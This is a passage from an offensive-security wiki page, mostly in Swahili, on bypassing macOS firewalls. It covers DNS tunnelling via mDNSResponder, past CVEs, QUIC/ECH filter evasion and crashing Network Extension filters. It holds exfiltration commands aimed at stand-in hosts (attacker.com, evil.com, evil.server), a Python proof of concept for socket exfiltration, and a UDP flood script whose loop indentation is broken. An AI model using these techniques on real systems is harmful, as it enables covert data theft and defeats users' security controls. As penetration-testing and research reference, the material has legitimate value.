# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Mbinu zilizopatikana

Mbinu zifuatazo zilionekana kufanya kazi katika baadhi ya firewall apps za macOS.

### Kutumia vibaya majina ya whitelist

- Kwa mfano, kuita malware kwa majina ya macOS processes zinazojulikana kama **`launchd`**

### Synthetic Click

- Ikiwa firewall itaomba ruhusa kutoka kwa mtumiaji, ifanye malware **ibofye allow**

### **Tumia Apple signed binaries**

- Kama vile **`curl`**, lakini pia nyingine kama **`whois`**

### Apple domains zinazojulikana

Firewall inaweza kuruhusu connections kwenye Apple domains zinazojulikana kama **`apple.com`** au **`icloud.com`**. Na iCloud inaweza kutumiwa kama C2.

### Generic Bypass

Baadhi ya mawazo ya kujaribu kupita firewalls

### Kagua traffic inayoruhusiwa

Kujua traffic inayoruhusiwa kutakusaidia kutambua domains ambazo huenda ziko kwenye whitelist au ni applications zipi zinaruhusiwa kuzifikia
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Kutumia DNS Vibaya

Kwenye macOS, process **haiwasiliani** na DNS server yenyewe. Name resolution hupitishwa kupitia **XPC** na **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), system daemon iliyosainiwa na Apple, hivyo kila lookup kwenye mashine huondoka kama traffic **kutoka kwa `mDNSResponder`** badala ya kutoka kwa process iliyoiomba. Kwa hiyo, firewalls huwa zinaamini daemon huyo bila masharti — kumzuia kungevuruga name resolution kwa mfumo mzima.<sup>[1]</sup>

Hilo linaifanya DNS kuwa channel inayobaki wazi hata firewall inapozuia sockets za malware yenyewe:<sup>[1]</sup>

1. Malware inajaribu kuunganisha na `evil.com`. Muunganisho wake wa kutoka unachunguzwa na firewall na **unazuiwa**.
2. Badala yake, malware inamwomba `mDNSResponder` afanye **resolve** ya `evil.com`, kupitia XPC.
3. Firewall inachunguza query inayotokana, inaona resolver anayeaminika aliyesainiwa na Apple kama originator, na **inairuhusu**.
4. Query inafika kwenye DNS server — na ikiwa attacker anaendesha authoritative server ya `evil.com`, anadhibiti pande zote mbili za exchange.

Kwa kuwa attacker anamiliki zone hiyo, hakuna "connection" inayohitajika kamwe: data inasafirishwa kwa siri ndani ya **queried labels** (kwa mfano, `<encoded-chunk>.evil.com`) na commands hurudi ndani ya **answer records** (TXT, A, CNAME…), ambayo ni DNS tunnelling ya kawaida inayotumia process iliyo kwenye whitelist kamili.

Process yoyote isiyo na privileges inaweza kuendesha daemon huyo moja kwa moja, jambo ambalo ni njia rahisi ya kuthibitisha kuwa njia hiyo iko wazi:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Kupitia Browser apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Kupitia processes injections

If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Recent macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
Mnamo Julai 2024 Apple ilirekebisha bug muhimu katika Safari/WebKit iliyoharibu “Web content filter” ya mfumo mzima inayotumiwa na parental controls za Screen Time.
URI iliyoundwa mahususi (kwa mfano, yenye “://” iliyowekwa URL-encoded mara mbili) haitambuliwi na Screen Time ACL lakini inakubaliwa na WebKit, hivyo ombi hutumwa nje bila kuchujwa. Kwa hiyo, process yoyote inayoweza kufungua URL (ikiwemo code iliyo sandboxed au unsigned) inaweza kufikia domains ambazo zimezuiwa wazi na mtumiaji au MDM profile.<sup>[2]</sup>

Practical test (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Hitilafu ya kupanga sheria za Packet Filter (PF) katika macOS 14 “Sonoma” ya awali
Wakati wa mzunguko wa beta wa macOS 14, Apple ilianzisha regression katika wrapper ya userspace inayozunguka **`pfctl`**.
Sheria zilizoongezwa kwa kutumia keyword ya `quick` (inayotumiwa na kill-switches nyingi za VPN) zilipuuzwa kimya kimya, na kusababisha traffic leaks hata wakati GUI ya VPN/firewall iliripoti kuwa *blocked*. Hitilafu hiyo ilithibitishwa na vendors kadhaa wa VPN na kurekebishwa katika RC 2 (build 23A344).

Ukaguzi wa haraka wa leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Kutumia vibaya helper services zilizotiwa saini na Apple (legacy – kabla ya macOS 11.2)
Kabla ya macOS 11.2, **`ContentFilterExclusionList`** iliruhusu takriban binary 50 za Apple kama vile **`nsurlsessiond`** na App Store kupita firewalls zote za socket-filter zilizotekelezwa kwa kutumia Network Extension framework (LuLu, Little Snitch, n.k.).
Malware ingeweza tu kuanzisha mchakato uliotengwa—au kuingiza code ndani yake—na kuelekeza traffic yake kupitia socket iliyokuwa tayari imeruhusiwa. Apple iliondoa kabisa exclusion list katika macOS 11.2, lakini technique hii bado ni muhimu kwenye systems ambazo haziwezi ku-upgrade.<sup>[3]</sup>

Mfano wa proof-of-concept (kabla ya 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH kwa kukwepa Network Extension domain filters (macOS 12+)
NEFilter Packet/Data Providers hutegemea TLS ClientHello SNI/ALPN. Kwa **HTTP/3 over QUIC (UDP/443)** na **Encrypted Client Hello (ECH)**, SNI hubaki ikiwa imesimbwa kwa njia fiche, NetExt haiwezi kuchanganua mtiririko, na hostname rules mara nyingi hushindwa katika hali ya fail-open, hivyo kuruhusu malware kufikia blocked domains bila kugusa DNS.<sup>[5]</sup>

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Ikiwa QUIC/ECH bado imewezeshwa, hii ni njia rahisi ya kukwepa hostname-filter.

### Kukosekana kwa uthabiti kwa macOS 15 “Sequoia” Network Extension (2024–2025)
Build za awali za 15.0/15.1 hu-crash third-party **Network Extension** filters (LuLu, Little Snitch, Defender, SentinelOne, n.k.). Filter inapoanza upya, macOS huondoa flow rules zake na products nyingi hushindwa katika hali ya fail-open. Kufurika filter kwa maelfu ya short UDP flows (au kulazimisha QUIC/ECH) kunaweza kurudia kusababisha crash na kuacha dirisha la C2/exfil huku GUI ikiendelea kudai kuwa firewall inaendeshwa.<sup>[4]</sup>

Uzalishaji wa haraka (safe lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Vidokezo vya tooling kwa macOS ya kisasa

1. Kagua sheria za sasa za PF zinazozalishwa na GUI firewalls:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Orodhesha binaries ambazo tayari zina entitlement ya *outgoing-network* (ya kufaa kwa piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Sajili programmatically content filter yako ya Network Extension katika Objective-C/Swift.
PoC ndogo ya rootless inayotuma packets kwenye local socket inapatikana katika source code ya **LuLu** ya Patrick Wardle.

## Marejeo

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Kutengeneza na Kuvunja macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass inaruhusu ufikiaji usio na vizuizi wa content iliyozuiwa (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Yaondoa Kipengele cha macOS Kilichoruhusu Apps Kupita Usalama wa Firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Zinaacha Kufanya Kazi Baada ya macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Tumia network protection kusaidia kuzuia connections za macOS kwenye sites hatari - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
